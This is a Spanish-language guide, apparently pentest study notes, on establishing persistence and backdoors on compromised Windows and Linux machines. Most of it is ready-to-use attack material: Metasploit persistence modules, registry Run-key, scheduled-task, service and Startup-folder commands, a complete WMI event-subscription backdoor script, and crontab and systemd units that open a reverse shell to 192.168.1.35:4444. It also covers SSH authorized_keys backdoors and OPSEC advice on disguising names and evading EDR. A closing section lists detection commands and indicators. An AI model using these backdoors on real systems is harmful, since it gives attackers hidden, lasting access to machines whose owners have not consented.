# Persistencia y Backdoors — Guía Completa

> La **persistencia** garantiza que el acceso al sistema comprometido se mantiene aunque se reinicie el equipo, se cierre la sesión o el payload original sea eliminado.

---

## Tabla de contenidos

1. [¿Por qué la persistencia es crítica?](#1-por-qué-la-persistencia-es-crítica)
2. [Registro de Windows — Run Keys](#2-registro-de-windows--run-keys)
3. [Tareas Programadas — Scheduled Tasks](#3-tareas-programadas--scheduled-tasks)
4. [Servicios de Windows](#4-servicios-de-windows)
5. [Carpeta Startup](#5-carpeta-startup)
6. [WMI Event Subscription](#6-wmi-event-subscription)
7. [Persistencia en Linux](#7-persistencia-en-linux)
8. [Consideraciones OPSEC](#8-consideraciones-opsec)
9. [Cómo detectar estas técnicas](#9-cómo-detectar-estas-técnicas)
10. [Cheat Sheet](#10-cheat-sheet)

---

## 1. ¿Por qué la persistencia es crítica?

Sin persistencia, el acceso se pierde en cualquiera de estos eventos:

```
❌ El usuario cierra sesión
❌ El sistema se reinicia
❌ El proceso del payload es terminado por el usuario o el AV
❌ La conexión de red se interrumpe temporalmente
```

Con persistencia:

```
✅ El backdoor se ejecuta automáticamente al reiniciar
✅ El acceso se recupera aunque el payload sea detectado
✅ El atacante puede reconectarse cuando quiera
```

### Consideraciones antes de elegir una técnica

| Factor | Preguntas clave |
|--------|-----------------|
| **Privilegios** | ¿Tengo SYSTEM, admin o usuario? Las opciones cambian. |
| **Sigilo** | ¿La técnica deja rastros obvios en el registro o en los logs? |
| **Resiliencia** | ¿Sobrevive a reinicios? ¿A actualizaciones del sistema? |
| **Detección** | ¿La detectan los EDR o antivirus modernos? |

---

## 2. Registro de Windows — Run Keys

Es la técnica de persistencia más clásica y conocida. Los valores en estas claves del registro se ejecutan automáticamente al iniciar sesión.

### Claves principales

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
→ Se ejecuta cuando inicia sesión el USUARIO ACTUAL
→ No requiere privilegios de administrador
→ Solo afecta al usuario que lo configuró

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
→ Se ejecuta cuando inicia sesión CUALQUIER USUARIO
→ Requiere privilegios de administrador
→ Más potente pero más visible

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
→ Se ejecuta solo UNA vez en el próximo inicio y luego se borra
→ Útil para instalar el backdoor definitivo
```

### Con Metasploit (automático)

```bash
# Desde Meterpreter con privilegios SYSTEM
meterpreter > background

msf > use exploit/windows/persistence/registry
msf > set SESSION 1
msf > set LHOST 192.168.1.35
msf > set LPORT 4444
msf > set STARTUP SYSTEM       # Escribe en HKLM (requiere SYSTEM)
# msf > set STARTUP USER       # Escribe en HKCU (solo necesita usuario)
msf > run

# Resultado:
# [+] Installed autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\oN8F1z6V
# [+] Meterpreter-compatible Cleanup RC File: /root/.msf4/logs/persistence/...
```

### Manual desde cmd/PowerShell

```powershell
# Añadir entrada de persistencia (HKCU, sin privilegios de admin)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
    /v "WindowsUpdate" `
    /t REG_SZ `
    /d "C:\Windows\Temp\payload.exe" `
    /f

# Verificar que se añadió
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# Eliminar (limpieza)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

### Otras claves de registro para persistencia

```
# Logon Scripts
HKCU\Environment\UserInitMprLogonScript

# Winlogon (se ejecuta durante el login, como SYSTEM)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → Userinit: añadir ,C:\ruta\payload.exe al valor existente
  → Shell: reemplazar explorer.exe por nuestro payload

# AppInit_DLLs (se inyecta en cada proceso que carga user32.dll)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  → AppInit_DLLs: ruta a la DLL maliciosa
  → LoadAppInit_DLLs: 1
```

---

## 3. Tareas Programadas — Scheduled Tasks

Las tareas programadas son más flexibles que las Run Keys: pueden ejecutarse en horas específicas, al iniciar el sistema, o con eventos concretos.

### Con Metasploit

```bash
msf > use exploit/windows/local/s4u_persistence
msf > set SESSION 1
msf > set LHOST 192.168.1.35
msf > set LPORT 4444
msf > set TRIGGER logon      # logon | interval | api_call
msf > run
```

### Manual con schtasks

```powershell
# Crear tarea que se ejecuta al iniciar Windows como SYSTEM
schtasks /create `
    /tn "WindowsDefenderUpdate" `
    /tr "C:\Windows\Temp\payload.exe" `
    /sc onstart `
    /ru SYSTEM `
    /f

# Crear tarea que se ejecuta cada hora
schtasks /create `
    /tn "SyncTask" `
    /tr "C:\Windows\Temp\payload.exe" `
    /sc hourly `
    /mo 1 `
    /f

# Listar tareas del sistema
schtasks /query /fo LIST /v | findstr "Task Name"

# Ejecutar la tarea manualmente
schtasks /run /tn "WindowsDefenderUpdate"

# Eliminar la tarea (limpieza)
schtasks /delete /tn "WindowsDefenderUpdate" /f
```

### Con PowerShell (más moderno y flexible)

```powershell
# Crear tarea con PowerShell
$action  = New-ScheduledTaskAction -Execute "C:\Windows\Temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask `
    -TaskName "BrowserUpdate" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest `
    -Force

# Ver la tarea
Get-ScheduledTask -TaskName "BrowserUpdate"

# Eliminar
Unregister-ScheduledTask -TaskName "BrowserUpdate" -Confirm:$false
```

---

## 4. Servicios de Windows

Crear un servicio malicioso que se ejecute automáticamente al arrancar el sistema. Requiere privilegios de **administrador** o **SYSTEM**.

### Con Metasploit

```bash
msf > use exploit/windows/local/service_permissions
msf > set SESSION 1
msf > set LHOST 192.168.1.35
msf > run
```

### Manual con sc.exe

```powershell
# Crear un servicio que ejecute el payload
sc create "WinUpdateSvc" `
    binPath= "C:\Windows\Temp\payload.exe" `
    start= auto `
    DisplayName= "Windows Update Service"

# Iniciar el servicio
sc start "WinUpdateSvc"

# Ver estado del servicio
sc query "WinUpdateSvc"

# Configurar descripción para parecer legítimo
sc description "WinUpdateSvc" "Manages the download and installation of Windows updates."

# Eliminar (limpieza)
sc stop "WinUpdateSvc"
sc delete "WinUpdateSvc"
```

> **Nota OPSEC:** Los servicios quedan listados en `services.msc` y son fáciles de detectar. Usar nombres que parezcan legítimos de Windows.

---

## 5. Carpeta Startup

Los archivos colocados en las carpetas Startup se ejecutan automáticamente cuando el usuario inicia sesión.

```
# Solo el usuario actual:
C:\Users\{usuario}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# Todos los usuarios (requiere admin):
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
```

```powershell
# Copiar el payload a la carpeta Startup del usuario actual
Copy-Item "C:\Windows\Temp\payload.exe" `
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"

# Con admin: copiar para todos los usuarios
Copy-Item "C:\Windows\Temp\payload.exe" `
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"
```

---

## 6. WMI Event Subscription

La técnica más sigilosa y persistente en Windows. Usa el **WMI** (Windows Management Instrumentation) para ejecutar código cuando ocurre un evento del sistema. No requiere modificar el registro ni crear servicios visibles.

```powershell
# Crear un filtro de evento (se activa al iniciar el sistema)
$FilterArgs = @{
    Name       = '__IntervalTimerInstruction'
    EventNameSpace = 'root\CIMv2'
    QueryLanguage  = 'WQL'
    Query      = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = New-CimInstance -Namespace root/subscription `
    -ClassName __EventFilter -Property $FilterArgs

# Crear el consumidor (lo que se ejecuta)
$ConsumerArgs = @{
    Name             = 'WmiBackdoor'
    ExecutablePath   = "C:\Windows\Temp\payload.exe"
}
$Consumer = New-CimInstance -Namespace root/subscription `
    -ClassName CommandLineEventConsumer -Property $ConsumerArgs

# Enlazar filtro y consumidor
$BindingArgs = @{
    Filter   = [Ref] $Filter
    Consumer = [Ref] $Consumer
}
New-CimInstance -Namespace root/subscription `
    -ClassName __FilterToConsumerBinding -Property $BindingArgs

Write-Host "Persistencia WMI establecida"
```

**¿Por qué es tan peligroso?**
- No aparece en el registro de Run keys
- No crea servicios visibles
- No aparece en la carpeta Startup
- Sobrevive a reinicios
- Muy difícil de encontrar sin herramientas específicas

**Limpieza:**
```powershell
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter |
    Where-Object {$_.Name -eq '__IntervalTimerInstruction'} | Remove-CimInstance

Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer |
    Where-Object {$_.Name -eq 'WmiBackdoor'} | Remove-CimInstance

Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding |
    Remove-CimInstance
```

---

## 7. Persistencia en Linux

### Crontab

La forma más sencilla de persistencia en Linux.

```bash
# Editar el crontab del usuario actual
crontab -e

# Añadir una línea que ejecute el payload cada minuto
* * * * * /tmp/.payload > /dev/null 2>&1

# O una reverse shell directa cada minuto
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.35/4444 0>&1' > /dev/null 2>&1

# Crontab del sistema (requiere root)
echo "* * * * * root /tmp/.payload" >> /etc/crontab

# Verificar crontabs activos
crontab -l
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
```

---

### SSH authorized_keys

Si el servicio SSH está activo, añadir nuestra clave pública permite conectarnos sin contraseña.

```bash
# En Kali: generar un par de claves
ssh-keygen -t ed25519 -f /root/.ssh/backdoor_key -N ""

# En el objetivo comprometido: añadir la clave pública
mkdir -p /home/usuario/.ssh
chmod 700 /home/usuario/.ssh

echo "TU_CLAVE_PUBLICA_AQUI" >> /home/usuario/.ssh/authorized_keys
chmod 600 /home/usuario/.ssh/authorized_keys

# Para root (si tenemos acceso root)
echo "TU_CLAVE_PUBLICA_AQUI" >> /root/.ssh/authorized_keys

# Desde Kali: conectar sin contraseña
ssh -i /root/.ssh/backdoor_key usuario@192.168.1.41
```

---

### Servicio systemd (Linux moderno)

```bash
# Crear un servicio que se ejecute al arrancar el sistema
cat > /etc/systemd/system/network-sync.service << 'EOF'
[Unit]
Description=Network Synchronization Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.35/4444 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable network-sync.service
systemctl start network-sync.service

# Verificar
systemctl status network-sync.service
```

---

## 8. Consideraciones OPSEC

**OPSEC** (Operations Security) se refiere a minimizar las huellas y reducir las posibilidades de detección.

| Técnica | Visibilidad | Resiliencia | OPSEC |
|---------|-------------|-------------|-------|
| Run Keys | 🔴 Alta (fácil de ver) | ✅ Alta | 🔴 Baja |
| Scheduled Tasks | 🟡 Media | ✅ Alta | 🟡 Media |
| Servicios | 🔴 Alta | ✅ Alta | 🔴 Baja |
| Startup Folder | 🔴 Alta | ✅ Alta | 🔴 Baja |
| WMI Subscription | 🟢 Baja | ✅ Alta | 🟢 Alta |
| Crontab | 🟡 Media | ✅ Alta | 🟡 Media |
| SSH authorized_keys | 🟢 Baja | ✅ Alta | 🟢 Alta |

**Recomendaciones OPSEC:**
- Usar nombres que imiten servicios o procesos legítimos de Windows.
- Almacenar el payload en directorios del sistema (`C:\Windows\Temp`, `C:\ProgramData`).
- Usar técnicas de in-memory cuando sea posible (sin escribir en disco).
- Preferir WMI sobre Run Keys en entornos con EDR activo.
- Limpiar el payload después de establecer la persistencia si es posible.

---

## 9. Cómo detectar estas técnicas

Esta sección es para el **defensor** (Blue Team).

### Herramientas de detección en Windows

```powershell
# ── Autoruns (Sysinternals — la mejor herramienta) ──────────────
# Muestra TODO lo que se ejecuta automáticamente en Windows
# Descargar: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

# ── Desde cmd/PowerShell: verificar Run Keys ─────────────────────
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# ── Listar todas las tareas programadas ──────────────────────────
schtasks /query /fo LIST /v

# ── Listar servicios no estándar de Windows ──────────────────────
Get-Service | Where-Object {$_.StartType -eq 'Automatic'} |
    Select-Object Name, DisplayName, Status

# ── Buscar suscripciones WMI maliciosas ──────────────────────────
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding

# ── Comprobar la carpeta Startup ──────────────────────────────────
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### Indicadores de compromiso (IOCs) a buscar

- Entradas en Run Keys con nombres inusuales o rutas sospechosas (`C:\Temp\`, `C:\Windows\Temp\`)
- Tareas programadas que ejecutan PowerShell con parámetros Base64 o rutas no estándar
- Servicios con `binPath` que apunta a directorios temporales
- Suscripciones WMI activas no reconocidas
- Archivos `.exe` en carpetas Startup que no pertenecen a software instalado

---

## 10. Cheat Sheet

```
══════════════════════════════════════════════════════════════
              PERSISTENCIA — CHEAT SHEET
══════════════════════════════════════════════════════════════

WINDOWS — REGISTRO (Run Keys)
  reg add "HKCU\...\Run" /v "Nombre" /t REG_SZ /d "C:\payload.exe" /f
  # Metasploit: use exploit/windows/persistence/registry
  # (set STARTUP SYSTEM para HKLM)

WINDOWS — TAREAS PROGRAMADAS
  schtasks /create /tn "Nombre" /tr "C:\payload.exe" /sc onstart /ru SYSTEM /f
  # Metasploit: use exploit/windows/local/s4u_persistence

WINDOWS — SERVICIOS
  sc create "NombreSvc" binPath= "C:\payload.exe" start= auto
  sc start "NombreSvc"

WINDOWS — STARTUP FOLDER
  copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
  copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

WINDOWS — WMI (más sigiloso)
  # Ver la sección 6 de esta guía para el script PowerShell completo

LINUX — CRONTAB
  (crontab -l; echo "* * * * * /tmp/.backdoor") | crontab -
  echo "* * * * * root /tmp/.backdoor" >> /etc/crontab

LINUX — SSH
  echo "PUBKEY" >> ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys

LINUX — SYSTEMD
  # Ver la sección 7 de esta guía para el .service completo

DETECCIÓN (Blue Team)
  Autoruns (Sysinternals)    → Todo lo que arranca automáticamente
  schtasks /query            → Tareas programadas
  Get-CimInstance (WMI)     → Suscripciones WMI
  reg query HKLM\...\Run    → Run Keys del sistema

LIMPIEZA (tras la auditoría)
  Metasploit genera un archivo .rc de limpieza automáticamente
  Revisar con Autoruns antes de dar el sistema por limpio

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [HackTricks — Windows Persistence](https://book.hacktricks.xyz/windows-hardening/windows-local-persistence)
- [MITRE ATT&CK — Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/)
- [PayloadsAllTheThings — Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
- [Sysinternals Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
